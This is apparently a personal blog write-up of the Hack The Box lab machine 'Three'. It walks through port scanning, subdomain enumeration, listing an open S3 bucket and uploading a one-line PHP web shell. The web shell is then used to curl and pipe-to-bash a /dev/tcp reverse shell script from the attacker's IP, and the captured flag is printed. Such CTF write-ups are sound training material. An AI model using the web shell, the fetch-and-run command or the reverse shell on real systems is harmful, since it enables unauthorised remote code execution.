---
title: "HTB - Three Writeup - Linux (Very Easy)"
date: 2026-10-25 12:00:00 -0400
categories: [HTB, Linux(Very Easy)]
tags: [htb, veryeasy, liunux]
image:
  path: /assets/img/headers/Three.png
  alt: HTB-Three
---


| Target Property  | Details                        |
| :--------------- | :----------------------------- |
| **Machine Name** | Three                          |
| **Platform**     | Hack The Box (Very Easy Linux) |
| **Server IP**    | 10.129.227.248                 |
| **Open Ports**   | 22, 80                         |
| **Date Solved**  | 2026/10/25                     |

![[Three.png]]


[Hack The Box - Three](https://app.hackthebox.com/machines/Three)



Port Scan 
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ nmap -p- -vvv --min-rate 10000 three.htb -oN nmap/three_allport --open  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-25 20:12 -0400
mass_dns: Using DNS server 192.168.4.1
mass_dns: Using DNS server fd0c:6c7b:e14c:1::1
Initiating Parallel DNS resolution of 1 host. at 20:12
Completed Parallel DNS resolution of 1 host. at 20:12, 0.00s elapsed
Initiating Ping Scan at 20:12
Scanning three.htb (10.129.227.248) [4 ports]
Completed Ping Scan at 20:12, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:12
Completed Parallel DNS resolution of 1 host. at 20:12, 0.00s elapsed
Initiating SYN Stealth Scan at 20:12
Scanning three.htb (10.129.227.248) [65535 ports]
Discovered open port 80/tcp on 10.129.227.248
Discovered open port 22/tcp on 10.129.227.248
Completed SYN Stealth Scan at 20:12, 8.64s elapsed (65535 total ports)
Nmap scan report for three.htb (10.129.227.248)
Host is up, received timestamp-reply ttl 63 (0.11s latency).
Scanned at 2026-10-25 20:12:42 EDT for 9s
Not shown: 61468 closed tcp ports (reset), 4065 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
           Raw packets sent: 85119 (3.745MB) | Rcvd: 62395 (2.496MB) 

```


found `s3.thetoppers.htb` subdomain
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]                                              └─$ gobuster vhost --append-domain -u http://thetoppers.htb -w ~/tools/wordlist/SecLists/Discovery/DNS/subdomains-top1million-20000.txt                            ===============================================================                                     Gobuster v3.8.2                                                                                     by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                       ==============================================================                                     [+] Url:                       http://thetoppers.htb                                                [+] Method:                    GET                                                                  [+] Threads:                   10                                                                   [+] Wordlist:                  /home/chako/tools/wordlist/SecLists/Discovery/DNS/subdomains-top1million-20000.txt                                                                               [+] User Agent:                gobuster/3.8.2                                                       [+] Timeout:                   10s                                                                  [+] Append Domain:             true                                                                 [+] Exclude Hostname Length:   false                                                                ===============================================================                                     Starting gobuster in VHOST enumeration mode                                                         ===============================================================                                     s3.thetoppers.htb Status: 404 [Size: 21]
c1_arvofgagit.thetoppers.htb Status: 400 [Size: 306]
default._bimi.thetoppers.htb Status: 400 [Size: 306]
Progress: 20000 / 20000 (100.00%)
===============================================================
Finished
===============================================================
```



update `/etc/hosts` file
```
10.129.227.248 three.htb thetoppers.htb s3.thetoppers.htb

```



we  found its subdomain `http://s3.thetoppers.htb/`
![[Write-Up/HTB/Very Easy/IMG/Three/2.png]]
![Orion Web Interface](/assets/img/Write-Up/HTB/veryeasy/linux/Three/2.png)


install `awscli` so we could try to interact with s3 service
```
sudo apt install awscli -y

┌──(chako㉿kali)-[~]
└─$ aws --version                                                                                   aws-cli/2.36.17 Python/3.14.7 Linux/7.1.5+kali-amd64 source/x86_64.kali.2026
```


set up the AWS CLI installation and list all of the S3 buckets

```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ aws configure                                                                                   Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp

┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ aws s3 ls --endpoint=http://s3.thetoppers.htb                                                   2026-10-25 20:05:26 thetoppers.htb


```

we could  list files on `s3.thetoppers.htb`
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb --recursive               2026-10-25 20:05:26          0 .htaccess
2026-10-25 20:05:26      90172 images/band.jpg
2026-10-25 20:05:26     282848 images/band2.jpg
2026-10-25 20:05:26    2208869 images/band3.jpg
2026-10-25 20:05:26      77206 images/final.jpg
2026-10-25 20:05:26      69170 images/mem1.jpg
2026-10-25 20:05:26      39270 images/mem2.jpg
2026-10-25 20:05:26      64347 images/mem3.jpg
2026-10-25 20:05:26      11952 index.php


```

This command breaks down into four distinct pieces that tell the AWS CLI to ignore Amazon's actual cloud servers and talk directly to your Hack The Box target machine instead.

Here is exactly what each part of **`aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb --recursive`** is doing:

- **`aws s3 ls`**  
    This initiates the AWS CLI tool and calls the standard **List** (`ls`) command used to view files and folders.
- **`s3://thetoppers.htb`**  
    This specifies the **Bucket Name** you are trying to peek inside. On this specific HTB server, the directory containing the web files was created with the name `thetoppers.htb`.
- **`--endpoint-url http://s3.thetoppers.htb`**  
    This is the crucial CTF trick. By default, the AWS CLI tries to send requests out to the internet to actual Amazon datacenters (like `://amazonaws.com`). This flag forces the CLI to **reroute the network request** directly to the local domain `http://s3.thetoppers.htb` mapped in your `/etc/hosts` file.
- **`--recursive`**  
    Without this, the command would only show top-level folders. This flag tells the tool to perform a **deep search**, displaying every file, subfolder, and nested asset inside that bucket.



Lets create a simple php web shell
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php

```

Upload the Web Shell to the S3 Bucket
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ aws s3 cp shell.php s3://thetoppers.htb/shell.php --endpoint-url http://s3.thetoppers.htb       upload: ./shell.php to s3://thetoppers.htb/shell.php              


```


read the flag
```
http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt

and it will print
a980d99281a28d638ac68b9bf9453c2b 
```


Strategy: Two-Stage Reverse Shell Execution

Direct reverse shell one-liners often fail or get cut off due to URL encoding issues, special character handling, or web server limitations within the PHP `system()` function.

To bypass this restriction, a more reliable **two-stage execution** method can be used:


Stage 1 (Payload Staging): Create a dedicated Bash reverse shell script locally on the Kali machine.

Stage 2 (Delivery & Execution): Force the target host to download the script via the existing web shell and execute it directly in its native terminal environment.

```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ cat shell.sh
bash -i >& /dev/tcp/10.10.14.144/4500 0>&1

┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.227.248 - - [25/Oct/2026 21:21:17] "GET /shell.sh HTTP/1.1" 200 -
# run the web shell to donwload and run the shell.sh 
http://thetoppers.htb/shell.php?cmd=curl%20http://10.10.14.144/shell.sh|bash

```



now we got reversed shell and got the flag
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/3-Three]
└─$ nc -lvnp 4500
listening on [any] 4500 ...
connect to [10.10.14.144] from (UNKNOWN) [10.129.227.248] 36138
bash: cannot set terminal process group (1503): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.6 LTS
Release:        18.04
Codename:       bionic
www-data@three:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root     4096 Jul 19  2022 .
drwxr-xr-x 13 root root     4096 Jul 19  2022 ..
-rw-r-----  1 root www-data   33 Jul 19  2022 flag.txt
drwxr-xr-x  3 root root     4096 Oct 26 01:04 html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
www-data@three:/var/www$ 


```



ref:
[https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html)

